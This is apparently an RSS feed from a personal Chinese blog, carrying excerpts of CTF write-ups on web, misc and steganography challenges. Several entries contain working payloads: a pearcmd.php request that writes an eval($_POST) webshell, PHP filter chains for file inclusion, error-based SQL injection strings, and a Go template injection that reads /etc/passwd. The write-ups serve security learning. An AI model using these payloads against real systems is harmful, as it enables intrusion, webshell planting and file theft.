<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Ctf - Category - ThnPinkman’s blog</title>
        <link>https://thnpkm.github.io/categories/ctf/</link>
        <description>Ctf - Category - ThnPinkman’s blog</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/categories/ctf/" rel="self" type="application/rss+xml" /><item>
    <title>NSS#roun8 web专项赛</title>
    <link>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</guid>
    <description><![CDATA[MyPage Where is my page？
拿到题目就是这个样子
感觉就是文件包含
可以读取，可以用filter协议
但是index.php怎么尝试都没读取到,data和input等协议都被ban了
方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
index.php源码是
&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
/proc/self/root/多级连接绕过原理可参考此文
require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.]]></description>
</item>
<item>
    <title>Python pth文件写入getshell</title>
    <link>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</guid>
    <description><![CDATA[原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
D:/Python/temp/ 重新启动python
1.path的路径被添加到sys.path中
site.py的实现中，有这么一段
def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.]]></description>
</item>
<item>
    <title>0xgame2022</title>
    <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/0xgame2022/</guid>
    <description><![CDATA[do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子]]></description>
</item>
<item>
    <title>2020羊城杯</title>
    <link>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
    <description><![CDATA[WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !]]></description>
</item>
<item>
    <title>2023巅峰极客</title>
    <link>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
    <description><![CDATA[web hellsql 测试后发现没有啥有用的回显，只有触发了waf才回显nonono
只要没触发waf不论sql语句是否正确都只回显： 泰酷辣！
所以没有布尔回显的话，布尔盲注不可行。
想去时间盲注，发现sleep等常用的关键字被禁的很严，尝试去绕过，失败
想去写shell，union被过滤的也很严，绕过无果
最后wp还是时间盲注，不过是用笛卡尔积
话说笛卡尔积确实在当初学mysql 的时候学到过，早已淡忘。现在来看看这个是什么样的思路：
具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统
unserialize 反序列化字符逃逸
misc findme find.dmp文件
010里
Netfilx图片格式
avif的文件头 66 74 79 70 61 76 69 66
手动分离出avif图片
生物 脑洞题
两张相同图片。盲水印
得到信息：甲硫氨酸
某个图片后面拿到一串氨基酸缩写
MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM 甲硫氨酸对应的缩写是 M
到这里就挺迷惑的了
也想到了找M对应的下标
0 3 5 6 10 11 15 16 18 19 21 24 25 27 28 30 34 35 37 38 40 42 44 45 46 47 49 50 52 53 55 57 58 59 61 63 65 66 67 69 70 71 72 74 76 78 80 81 82 83 85 86 87 89 90 91 92 94 95 96 98 100 102 103 104 105 107 108 109 111 113 114 116 118 119 121 122 124 126 128 130 131 132 133 135 137 139 141 142 143 144 146 148 150 152 154 156 157 159 160 162 164 165 167 168 170 171 173 174 176 178 179 180 181 183 184 186 187 188 190 192 194 195 197 198 200 201 203 204 205 207 209 211 213 214 215 后面提示了找位置，但是没想到最后还是搞bin]]></description>
</item>
<item>
    <title>b01lers CTF</title>
    <link>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</guid>
    <description><![CDATA[2023 web warmup 是一个flask的站，访问文件需要先base64编码
/app.py编码拿到源码
from base64 import b64decode import flask app = flask.Flask(__name__) @app.route(&#39;/&lt;name&gt;&#39;) def index2(name): name = b64decode(name) if (validate(name)): return &#34;This file is blocked!&#34; try: file = open(name, &#39;r&#39;).read() except: return &#34;File Not Found&#34; return file @app.route(&#39;/&#39;) def index(): return flask.redirect(&#39;/aW5kZXguaHRtbA==&#39;) def validate(data): if data == b&#39;flag.txt&#39;: return True return False if __name__ == &#39;__main__&#39;: app.run() 这里对flag.txt做了严格过滤，当时的思路还是什么加空格换行绕过，不过相对路径就可以绕过。
./flag.txt相对路径，即可绕过检测
fishy-motd 2020 web Welcome to Earth 之前buu写过了
抓包一直找路由，一直走
最后拿到flag]]></description>
</item>
<item>
    <title>BUUCTF NewStarCTF</title>
    <link>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</guid>
    <description><![CDATA[week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
联合查询 ，没有回显点
报错查询
name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
拿到正确的种子
&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?]]></description>
</item>
<item>
    <title>CatCTF</title>
    <link>https://thnpkm.github.io/posts/ctf/catctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/catctf/</guid>
    <description><![CDATA[MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
strings xxx | grep CatCTF{
Peekaboo MeowMeow CatCTF{CAT_GOES_MEOW} ,010打开看ascii的形状，ctfshow有一道这样的题
miao~ strings 了一下，出现这一堆
网上有些题是 直接看属性有东西，exiftool没发现啥
foremost 出 wav ，频谱图
CatCTF 某个密码
试试jpg隐写的工具，都没试出来，卡这里了，wav我也去尝试了silenteye没结果
正确是DeepSound工具解密，之前没用过 ,选择wav输入密码，得到个flag.txt
在他默认保存路径可以打开flag.txt
然后兽语解密
CatCat 这个文件名一看就猜测是 rabbit加密 和base91
rabbit的密钥，jpg用010打开搜索pass
密钥是catflag
然后base91
这一看就是Ook解密，将cat替换成Ook
CatchCat 可爱的猫猫走丢了，还好猫猫有GPS定位装置，我们陆陆续续在终端收到了GPS数据，你能帮忙找到可爱的猫猫吗？
给了一堆GPGGA的数据，找了很久没有找到合适的网站
想着提取出经纬度
f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:30]+&#39;,&#39;+line[33:47]) 刚开始用gnuplot画个图，但是画出来看不出啥，想着去用谷歌地球画路线，不过需要KML文件
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;kml xmlns=&#34;http://www.opengis.net/kml/2.2&#34;&gt; &lt;Document&gt; &lt;name&gt;KML&lt;/name&gt; &lt;description&gt;KML&lt;/description&gt; &lt;Placemark&gt; &lt;name&gt;[2011/2/1 19:59:14]&lt;/name&gt; &lt;description&gt;line&lt;/description&gt; &lt;LineString&gt; &lt;coordinates&gt; 3416.48590278,10856.86623887 3416.48590278,10856.86623887 .......................... &lt;/coordinates&gt; &lt;/LineString&gt; &lt;/Placemark&gt; &lt;/Document&gt; &lt;/kml&gt; 将经纬度替换后，导入谷歌地球]]></description>
</item>
<item>
    <title>ciscn2023初赛</title>
    <link>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</guid>
    <description><![CDATA[go_session GET /admin?name={%25%20include%20c.Request.Header.Accept.0%20%25} HTTP/1.1Host: 123.56.99.60:12488Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: /etc/passwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session-name=MTY4NTE2NjEzNnxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFqXzRJQUFRWnpkSEpwYm1jTUJnQUVibUZ0WlFaemRISnBibWNNQndBRllXUnRhVzQ9fEDXM_0GyRu_LshoipBIWA6dvJ8u4d-oTgM7OGlKvC2SConnection: close 实现任意文件读取
还是]]></description>
</item>
<item>
    <title>D^3ctf 2023</title>
    <link>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</guid>
    <description><![CDATA[web EscapePlan 源码是ban了很多字符和关键字
black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;+&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
例如：
int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通]]></description>
</item>
</channel>
</rss>
